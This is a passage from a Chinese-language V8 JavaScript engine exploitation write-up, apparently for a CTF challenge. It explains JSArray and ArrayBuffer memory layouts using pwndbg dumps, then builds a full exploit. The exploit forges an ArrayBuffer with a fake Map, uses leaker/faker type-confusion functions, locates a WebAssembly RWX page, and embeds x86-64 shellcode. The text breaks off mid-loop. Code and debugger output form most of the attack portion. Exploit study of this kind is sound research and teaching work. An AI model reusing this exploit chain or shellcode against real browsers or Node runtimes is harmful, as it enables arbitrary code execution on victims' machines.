        #length: 0x3860ab3401a9  (const accessor descriptor)
     }
     - elements: 0x0831db04dd71  {
               0: 1.1
               1: 2.2
               2: 3.3
     }
    0x2b36a3c82ed9: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: PACKED_DOUBLE_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x2b36a3c82e89 
     - prototype_validity cell: 0x3860ab340609 
     - instance descriptors #1: 0x251f23191f49 
     - layout descriptor: (nil)
     - transitions #1: 0x251f23191eb9 Transition array #1:
         0x25361adc4ba1 : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x2b36a3c82f29 
     - prototype: 0x251f23191111 
     - constructor: 0x251f23190ec1 
     - dependent code: 0x25361adc02c1 
     - construction counter: 0
    pwndbg> x/12gx 0x831db04dd99-1                      // JSArray
    0x831db04dd98:  0x00002b36a3c82ed9  0x000025361adc0c71  // Map Properties
    0x831db04dda8:  0x00000831db04dd71  0x0000000300000000  // Elements Length
    0x831db04ddb8:  0x000025361adc0941  0x00000adc7d437082
    0x831db04ddc8:  0x6974636e7566280a  0x220a7b2029286e6f
    0x831db04ddd8:  0x6972747320657375  0x2f2f0a0a3b227463
    0x831db04dde8:  0x2065726f6d204120  0x6173726576696e75
    pwndbg> x/12gx 0x831db04dd71-1                      // Elements
    0x831db04dd70:  0x000025361adc14f9  0x0000000300000000  // Map Length
    0x831db04dd80:  0x3ff199999999999a  0x400199999999999a  // 1.1 2.2
    0x831db04dd90:  0x400a666666666666  0x00002b36a3c82ed9  // 3.3
    0x831db04dda0:  0x000025361adc0c71  0x00000831db04dd71
    0x831db04ddb0:  0x0000000300000000  0x000025361adc0941
    0x831db04ddc0:  0x00000adc7d437082  0x6974636e7566280a
从地址很容易可以看出，在Elements的后面紧跟的就是JSArray对象的Map，布局如下图
    Elements--->+-------------+
                |  MAP        +--------------+       |
                |  MAP        |       |
                +-------------+       |
                |  Properties |       |
                +-------------+       |
                |  Elements   +-------+
                +-------------+
                |  Length     |
                +-------------+
                |     ...     |
                +-------------+
这意味着我们可以通过JSArray对象的地址来计算得到其Elements的地址，这为我们之后伪造ArrayBuffer后寻找其地址提供了便利。
**trick**
：在调试过程中会发现，Elements并不是始终紧邻JSArray的，有些时候两者会相距一段距离。在师傅们的wp中提到可以使用`splice`来使该布局稳定，例如
    var arr = [1.1, 2.2, 3.3].splice(0);
具体原理我没有找到相关资料。。可能只有等以后读了源码才知道吧（有师傅知道的话可以说说吗
### ArrayBuffer内存模型
在伪造ArrayBuffer的时候需要同时也伪造出它的Map的结构（当然，也可以对内存中ArrayBuffer的Map地址进行泄露，但是就麻烦了），通过找到JSArray的地址，+0x40即为map的地址，再将map地址填入JSArray的第一项即可。
这部分可以通过调试一个真正的ArrayBuffer并将其Map复制下来（这里并不需要全部的数据）。关于Map的内存模型可以参考[这里](https://github.com/v8/v8/blob/master/src/objects/map.h)。
    var fake_ab = [ 
        //map|properties
        mem.u2d(0x0), mem.u2d(0x0),
        //elements|length
        mem.u2d(0x0), mem.u2d(0x1000),
        //backingstore|0x2
        mem.u2d(0x0), mem.u2d(0x2),
        //padding
        mem.u2d(0x0), mem.u2d(0x0),
        //fake map
        mem.u2d(0x0), mem.u2d(0x1900042317080808),
        mem.u2d(0x00000000084003ff), mem.u2d(0x0),
        mem.u2d(0x0), mem.u2d(0x0),
        mem.u2d(0x0), mem.u2d(0x0),
    ].splice(0);
### 获取伪造的ArrayBuffer
和poc的代码类似，不过反了过来，先将填入一个ArrayBuffer进行优化，然后在ArrayBuffer处写入地址，则该地址将作为ArrayBuffer被解析
    var ab = new ArrayBuffer(0x1000);
    var obj2 = {d: {w: ab}};
    function faker(o){
        return o.d.w;
    }
    for(var i = 0; i  r --allow-natives-syntax ../../exps/OOB/test.js
    DebugPrint: 0x3a58a3a21241: [WasmInstanceObject] in OldSpace
     - map: 0x0764807492b9  [FastProperties]
     - prototype: 0x00aad2e48559 
     - elements: 0x3b8a08680c01  [HOLEY_ELEMENTS]
     - module_object: 0x00aad2e4d5b9 
    ...
    pwndbg> x/32gx 0x3a58a3a21241-1
    0x3a58a3a21240: 0x00000764807492b9  0x00003b8a08680c01
    0x3a58a3a21250: 0x00003b8a08680c01  0x0000000000000000
    0x3a58a3a21260: 0x0000000000000000  0x0000000000000000
    0x3a58a3a21270: 0x000055f7cd11b8f0  0x00003b8a08680c01
    0x3a58a3a21280: 0x000055f7cd1cd100  0x00003b8a086804b1
    0x3a58a3a21290: 0x0000000000000000  0x0000000000000000
    0x3a58a3a212a0: 0x0000000000000000  0x0000000000000000
    0x3a58a3a212b0: 0x000055f7cd1cd180  0x000055f7cd11b910
    0x3a58a3a212c0: 0x00000f8fe12f0000   vmmap 0x00000f8fe12f0000
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
         0xf8fe12f0000      0xf8fe12f1000 rwxp     1000 0
即`instance+0x80`处即存放了RWX区域的地址
    wasm_inst_addr = leak_obj(wasm_instance) - 1;
    rwx_area_loc = wasm_inst_addr + 0x80;   //获取存放RWX指针的地址
    //然后将rwx_area_loc填入ArrayBuffer的BackingStore即可泄露出RWX区域地址
## 完整利用
    function success(str, val){
        console.log("[+]" + str + "0x" + val.toString(16));
    }
    class Memory{
        constructor(){
            this.buf = new ArrayBuffer(8);
            this.f64 = new Float64Array(this.buf);
            this.u32 = new Uint32Array(this.buf);
            this.bytes = new Uint8Array(this.buf);
        }
        d2u(val){
            this.f64[0] = val;
            let tmp = Array.from(this.u32);
            return tmp[1] * 0x100000000 + tmp[0];
        }   
        u2d(val){
            let tmp = []; 
            tmp[0] = parseInt(val % 0x100000000);
            tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
            this.u32.set(tmp);
            return this.f64[0];
        }   
    }
    var mem = new Memory();
    var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    const wasm_code = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
        0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
        0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
        0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
        0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
        0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
        0x00, 0x00, 0x41, 0x00, 0x0b
      ]);
    const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
    const wasm_func = wasm_instance.exports.a;
    var fake_ab = [ 
        //map|properties
        mem.u2d(0x0), mem.u2d(0x0),
        //elements|length
        mem.u2d(0x0), mem.u2d(0x1000),
        //backingstore|0x2
        mem.u2d(0x0), mem.u2d(0x2),
        //padding
        mem.u2d(0x0), mem.u2d(0x0),
        //fake map
        mem.u2d(0x0), mem.u2d(0x1900042317080808),
        mem.u2d(0x00000000084003ff), mem.u2d(0x0),
        mem.u2d(0x0), mem.u2d(0x0),
        mem.u2d(0x0), mem.u2d(0x0),
    ];
    var ab = new ArrayBuffer(0x1000);
    var obj1 = {c: {x: 1.1}};
    var obj2 = {d: {w: ab}};
    function leaker(o){
        return o.c.x;
    }
    function faker(o){
        return o.d.w;
    }
    for(var i = 0; i 